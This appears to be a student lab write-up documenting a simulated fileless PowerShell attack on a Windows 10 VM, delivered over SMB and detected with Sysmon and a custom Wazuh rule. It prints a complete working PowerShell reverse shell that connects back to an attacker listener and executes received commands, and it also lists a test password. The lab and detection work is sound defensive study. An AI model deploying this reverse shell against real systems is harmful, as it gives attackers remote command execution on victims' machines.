# Scenario 1: Fileless Malware with PowerShell

## Overview
- **Date**: June 15, 2025
- **Target**: Windows 10 VM (IP: 192.168.1.101, Hostname: DESKTOP-FF0MPJM)
- **Attacker**: Arch Linux (IP: 192.168.1.55)
- **User**: testuser (Password: P@ssw0rd123)
- **Attack**: Spear-phishing simulation delivering a PowerShell reverse shell executed in memory via SMB (port 445) to establish a remote connection.
- **Objective**: Demonstrate fileless malware execution, detect via Sysmon and Wazuh, and document for Phase 3 submission.

## Attack Details
- **Method**: A PowerShell reverse shell script (`malicious.ps1`) was crafted manually due to Metasploit issues on the attacker machine. The script was delivered to the Windows 10 VM via an SMB share (`\\192.168.1.101\payload`) and executed in memory using `Invoke-Expression`.
- **Execution**:
  - Payload copied to `C:\Temp\malicious.ps1` via SMB using `smbclient`.
  - Executed on Windows 10 VM: `Invoke-Expression -Command (Get-Content C:\Temp\malicious.ps1)`.
  - Reverse shell connected to `netcat` listener on Arch Linux (port 4444).
- **Payload**:
  ```powershell
  $client = New-Object System.Net.Sockets.TCPClient("192.168.1.55",4444);
  $stream = $client.GetStream();
  [byte[]]$bytes = 0..65535|%{0};
  while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
      $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
      $sendback = (iex $data 2>&1 | Out-String);
      $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
      $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
      $stream.Write($sendbyte,0,$sendbyte.Length);
      $stream.Flush()
  };
  $client.Close()
  ```
- **Traffic Capture**: Network traffic captured using `tcpdump` on port 4444, saved as `phishing.pcap`.

## Detection
- **Sysmon**:
  - Event ID 1 (Process Creation): Captured `powershell.exe` execution.
  - Event ID 10 (Process Access): Monitored PowerShell process interactions.
  - Logs exported: `sysmon_events_phishing.evtx`.
- **Wazuh**:
  - Custom Rule ID: `100015`
    ```xml
    <rule id="100015" level="12">
      <if_sid>61601</if_sid>
      <field name="sysmon.image">powershell\.exe</field>
      <field name="sysmon.command_line">TCPClient|StreamWriter</field>
      <description>Fileless PowerShell malware execution</description>
      <mitre><id>T1059.001</id></mitre>
    </rule>
    ```
  - Alert Query: `rule.id:100015 AND agent.name:SIEM-Target-Windows-Local`
  - Screenshot: `wazuh_alert.png`
- **Wazuh Agent**: Confirmed connected to Wazuh Cloud endpoint.

## MITRE ATT&CK Mapping
- **T1059.001**: Command and Scripting Interpreter: PowerShell
  - Execution of malicious PowerShell script in memory.
- **T1566.001**: Phishing: Spearphishing Attachment
  - Simulated delivery of payload via SMB as a phishing attachment.

## Artifacts
- **Logs**:
  - `sysmon_events_phishing.evtx`: Sysmon logs from Windows 10 VM.
  - `phishing.pcap`: Network traffic captured on Arch Linux.
- **Screenshots**:
  - `wazuh_alert.png`: Wazuh Cloud dashboard alert.
  - `nc_session.png`: Netcat reverse shell session on Arch Linux.
- **Scripts**:
  - `malicious.ps1`: PowerShell reverse shell script.
- **Directory**: `/home/user/DetectAndDefend/Phase3/Scenario-1-FilelessMalware/{Logs,Screenshots,Scripts}`

## Challenges
- **Metasploit Unavailable**: Manual PowerShell reverse shell used due to issues with Metasploit and msfvenom on Arch Linux.
- **Port 80 Closed**: SMB (port 445) used for payload delivery as HTTP was unavailable.
- **User Passwords**: Passwords for `testuser`, `attacker`, and `hacker` forgotten; reset `testuser` to `P@ssw0rd123` via `Satvik Vemulapalli`.

## Status
- **Attack**: Successfully executed reverse shell, established connection via `netcat`.
- **Detection**: Sysmon and Wazuh alerts triggered and logged.
- **Submission**: Artifacts saved and committed to GitHub repository.

## Notes
- **AWS Deletion**: Pending confirmation (assumed deleted).
- **Ubuntu Droplet**: RDP blank screen unresolved (IP: 165.22.213.132); deferred for Lateral Movement scenario.
- **Next Steps**: Proceed with Scenario 3 (Persistence) and document remaining scenarios (Lateral Movement, DNS Tunneling, Credential Dumping).